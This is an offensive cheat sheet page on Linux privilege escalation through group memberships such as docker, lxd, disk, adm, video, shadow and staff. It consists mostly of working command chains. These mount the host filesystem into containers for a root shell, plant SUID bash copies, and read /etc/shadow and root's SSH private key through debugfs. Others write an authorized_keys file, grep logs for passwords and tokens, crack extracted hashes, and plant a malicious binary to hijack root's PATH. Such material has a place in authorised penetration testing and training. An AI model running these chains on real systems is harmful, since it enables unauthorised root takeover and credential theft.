title: Linux PrivEsc — Docker / LXD / Group Abuse
html:
Linux PrivEsc — Docker / LXD / Group Abuse

Group memberships often grant access to powerful resources. Docker, LXD, disk, adm, video, and shadow groups all provide privilege escalation paths without needing SUID binaries or sudo.

Check Group Memberships

# Current user's groups
id
groups

# High-value groups to look for:
# docker, lxd, lxc, disk, adm, shadow, video, staff, sudo, wheel

# All group memberships on system
cat /etc/group | grep -v '^$'

# Find users in interesting groups
cat /etc/group | grep 'docker\|lxd\|disk\|adm\|shadow\|video'

Docker Group

Members of the docker group can mount the host filesystem into a container and chroot to get root.

# Confirm docker group
id | grep docker
docker ps

# Mount host root filesystem into container
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# With bash
docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash

# Read /etc/shadow from host
docker run --rm -v /:/mnt alpine cat /mnt/etc/shadow

# Add SUID bash on host
docker run --rm -v /:/mnt alpine sh -c 'cp /mnt/bin/bash /mnt/tmp/bash; chmod +s /mnt/tmp/bash'
/tmp/bash -p

# Using busybox if alpine not available
docker run -v /:/hostfs --rm busybox chroot /hostfs sh

# If no internet, use existing images
docker images
docker run -v /:/mnt --rm -it <existing_image> chroot /mnt sh

LXD/LXC Group

LXD group membership allows creating privileged containers that mount the host filesystem.

# Check LXD available
id | grep lxd
lxc list

# Full exploit chain (build alpine image on attacker, transfer to target)
# --- On attacker machine ---
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
sudo ./build-alpine
# Transfers alpine-v3.XX-x86_64-XXXXXX.tar.gz to target

# --- On target ---
# Import image
lxc image import ./alpine-v3.XX-x86_64-XXXXXX.tar.gz --alias myimage

# Create privileged container
lxc init myimage ignite -c security.privileged=true

# Add host disk device
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true

# Start container
lxc start ignite

# Get shell and chroot into host
lxc exec ignite -- /bin/sh
chroot /mnt/root /bin/bash

# Now running as root with full access to host filesystem
cat /etc/shadow
cat /root/.ssh/id_rsa

# Cleanup
lxc stop ignite
lxc delete ignite
lxc image delete myimage

LXC Quick Method (if container already exists)

# List existing containers
lxc list

# Exec into existing privileged container
lxc exec <container_name> -- /bin/bash

# If not privileged, try escalating within
lxc config set <container_name> security.privileged true
lxc restart <container_name>

Disk Group

The disk group gives raw block device access — use debugfs to read any file on the filesystem.

# Confirm disk group
id | grep disk

# Find the root partition
df -h
lsblk
fdisk -l 2>/dev/null

# Open with debugfs (read-only exploration)
debugfs /dev/sda1

# Inside debugfs, read files:
debugfs:  cat /etc/shadow
debugfs:  cat /root/.ssh/id_rsa
debugfs:  ls /root

# One-liner to read /etc/shadow
debugfs -R 'cat /etc/shadow' /dev/sda1 2>/dev/null

# Read root's SSH private key
debugfs -R 'cat /root/.ssh/id_rsa' /dev/sda1 2>/dev/null

# Write a file (be careful!)
debugfs -w -R 'write /tmp/authorized_keys /root/.ssh/authorized_keys' /dev/sda1

ADM Group

The adm group can read system logs — useful for credential harvesting from log files.

# Confirm adm group
id | grep adm

# Read authentication logs for credentials
cat /var/log/auth.log
cat /var/log/auth.log | grep -i 'password\|pass\|user\|username'

# Check for passwords typed as usernames (common mistake)
grep 'Failed password' /var/log/auth.log
grep 'Invalid user' /var/log/auth.log

# Apache/Nginx logs may contain credentials in URLs
cat /var/log/apache2/access.log | grep -i 'pass\|token\|key\|secret'
cat /var/log/nginx/access.log | grep -i 'pass\|token\|key\|secret'

# All readable logs
ls -la /var/log/
find /var/log -readable -type f 2>/dev/null | head -20

Video Group

# Confirm video group
id | grep video

# Check framebuffer devices
ls -la /dev/fb*

# Capture framebuffer (screenshot of display)
cat /dev/fb0 > /tmp/screenshot.raw

# Get display dimensions from /sys
cat /sys/class/graphics/fb0/virtual_size

# Convert on attacker with ffmpeg
# ffmpeg -f rawvideo -pixel_format bgra -video_size WxH -i screenshot.raw screenshot.png

Shadow Group

# Confirm shadow group
id | grep shadow

# Read /etc/shadow directly
cat /etc/shadow

# Extract all hashes for cracking
cat /etc/shadow | grep -v '!' | grep -v '*' | awk -F: '{print $1":"$2}'

# Crack with hashcat on attacker
# hashcat -m 1800 hashes.txt <wordlist> (SHA-512 crypt)
# hashcat -m 500 hashes.txt <wordlist>  (MD5 crypt)

# Crack with john
unshadow /etc/passwd /etc/shadow > /tmp/unshadowed.txt
john --wordlist=<wordlist> /tmp/unshadowed.txt

Staff Group

# staff group members can write to /usr/local without sudo
id | grep staff
ls -la /usr/local/

# If writable, place malicious binary before system binaries in PATH
cp /tmp/evil /usr/local/bin/ls
# Wait for root to run 'ls' via script or cron
excerpt: Exploit Docker, LXD, disk, adm, shadow, and video group memberships for Linux privilege escalation — full chains for container escapes and filesystem access.
